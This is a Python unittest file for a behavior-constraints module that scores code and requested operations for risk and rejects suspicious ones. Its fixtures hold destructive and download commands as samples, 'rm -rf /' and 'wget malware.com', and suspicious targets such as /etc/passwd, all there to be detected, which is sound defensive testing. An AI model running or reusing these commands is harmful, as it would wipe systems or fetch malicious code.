"""
Tests for the SACP behavior constraints system
"""

import unittest
import tempfile
import os
from pathlib import Path
import time
from datetime import datetime

from src.constraints.behavior import (
    ContextType,
    IntentType,
    RiskLevel,
    OperationContext,
    Intent,
    ContextAnalyzer,
    IntentValidator,
    BehaviorConstraints
)


class TestBehaviorConstraints(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.constraints = BehaviorConstraints()

    def tearDown(self):
        import shutil
        shutil.rmtree(self.temp_dir)

    def create_test_file(self, content: str) -> str:
        """Create a temporary Python file with given content"""
        file_path = Path(self.temp_dir) / "test.py"
        with open(file_path, 'w') as f:
            f.write(content)
        return str(file_path)

    def test_context_analysis(self):
        # Create test file
        code = """
        import os
        import sys
        
        def risky_function():
            os.system("rm -rf /")  # Dangerous!
            
        class TestClass:
            def __init__(self):
                pass
        """
        
        file_path = self.create_test_file(code)
        analyzer = ContextAnalyzer()
        
        # Test code context
        context = analyzer.analyze_code_context(file_path)
        self.assertEqual(context.context_type, ContextType.CODE_CONTEXT)
        self.assertGreaterEqual(context.risk_level, RiskLevel.MODERATE)
        
        # Test runtime context
        context = analyzer.analyze_runtime_context()
        self.assertEqual(context.context_type, ContextType.RUNTIME_CONTEXT)
        self.assertIn('python_version', context.data)
        
        # Test user context
        context = analyzer.analyze_user_context(
            "test_user",
            {"failed_operations": 0}
        )
        self.assertEqual(context.context_type, ContextType.USER_CONTEXT)
        self.assertEqual(context.data['user_id'], "test_user")
        
        # Test system context
        context = analyzer.analyze_system_context()
        self.assertEqual(context.context_type, ContextType.SYSTEM_CONTEXT)
        self.assertIn('cpu_percent', context.data)
        
        # Test security context
        context = analyzer.analyze_security_context(
            {'READ', 'WRITE'},
            'MODERATE'
        )
        self.assertEqual(context.context_type, ContextType.SECURITY_CONTEXT)
        self.assertEqual(len(context.data['permissions']), 2)

    def test_intent_validation(self):
        validator = IntentValidator()
        
        # Create test file
        file_path = self.create_test_file("print('test')")
        
        # Create contexts
        code_context = OperationContext(
            context_type=ContextType.CODE_CONTEXT,
            timestamp=datetime.now(),
            data={'file_path': file_path},
            risk_level=RiskLevel.LOW
        )
        
        user_context = OperationContext(
            context_type=ContextType.USER_CONTEXT,
            timestamp=datetime.now(),
            data={'user_id': 'test_user'},
            risk_level=RiskLevel.LOW
        )
        
        # Test valid read intent
        read_intent = Intent(
            intent_type=IntentType.READ,
            description="Read test file",
            target_paths=[file_path],
            required_permissions={'READ'},
            estimated_risk=RiskLevel.LOW,
            context={
                ContextType.CODE_CONTEXT: code_context,
                ContextType.USER_CONTEXT: user_context
            }
        )
        
        self.assertTrue(validator.validate_intent(read_intent))
        
        # Test invalid path
        invalid_intent = Intent(
            intent_type=IntentType.READ,
            description="Read invalid file",
            target_paths=["/etc/passwd"],  # Suspicious path
            required_permissions={'READ'},
            estimated_risk=RiskLevel.LOW,
            context={
                ContextType.CODE_CONTEXT: code_context,
                ContextType.USER_CONTEXT: user_context
            }
        )
        
        self.assertFalse(validator.validate_intent(invalid_intent))

    def test_behavior_constraints(self):
        # Create test file
        file_path = self.create_test_file("print('test')")
        
        # Test read intent creation
        read_intent = self.constraints.create_intent(
            intent_type=IntentType.READ,
            description="Read test file",
            target_paths=[file_path],
            required_permissions={'READ'},
            user_id="test_user",
            session_data={"failed_operations": 0}
        )
        
        self.assertIsNotNone(read_intent)
        self.assertEqual(read_intent.intent_type, IntentType.READ)
        
        # Test high-risk intent
        execute_intent = self.constraints.create_intent(
            intent_type=IntentType.EXECUTE,
            description="Execute command",
            target_paths=["/bin/rm"],  # Suspicious path
            required_permissions={'EXECUTE'},
            user_id="test_user",
            session_data={"failed_operations": 0}
        )
        
        self.assertIsNone(execute_intent)  # Should be rejected
        
        # Test operation history
        history = self.constraints.get_operation_history(minutes=5)
        self.assertEqual(len(history), 1)  # Only the read intent
        self.assertEqual(history[0].intent_type, IntentType.READ)

    def test_custom_validators(self):
        validator = IntentValidator()
        
        # Add custom validator
        def no_write_validator(intent: Intent) -> bool:
            return 'WRITE' not in intent.required_permissions
        
        validator.register_validator(IntentType.MODIFY, no_write_validator)
        
        # Create test intent
        file_path = self.create_test_file("print('test')")
        code_context = OperationContext(
            context_type=ContextType.CODE_CONTEXT,
            timestamp=datetime.now(),
            data={'file_path': file_path},
            risk_level=RiskLevel.LOW
        )
        
        # Test intent with WRITE permission
        write_intent = Intent(
            intent_type=IntentType.MODIFY,
            description="Modify file",
            target_paths=[file_path],
            required_permissions={'WRITE'},
            estimated_risk=RiskLevel.MODERATE,
            context={ContextType.CODE_CONTEXT: code_context}
        )
        
        self.assertFalse(validator.validate_intent(write_intent))

    def test_risk_escalation(self):
        # Create test file with risky content
        code = """
        import os
        import subprocess
        
        def dangerous_function():
            os.system("rm -rf /")
            subprocess.call("wget malware.com", shell=True)
        """
        
        file_path = self.create_test_file(code)
        
        # Test intent creation with escalating risk
        for _ in range(5):  # Create multiple high-risk operations
            intent = self.constraints.create_intent(
                intent_type=IntentType.EXECUTE,
                description="Execute risky command",
                target_paths=[file_path],
                required_permissions={'EXECUTE'},
                user_id="test_user",
                session_data={"failed_operations": 3}
            )
            
            # Should eventually escalate to high risk
            if intent:
                self.assertGreaterEqual(
                    intent.estimated_risk,
                    RiskLevel.HIGH
                )


if __name__ == '__main__':
    unittest.main()
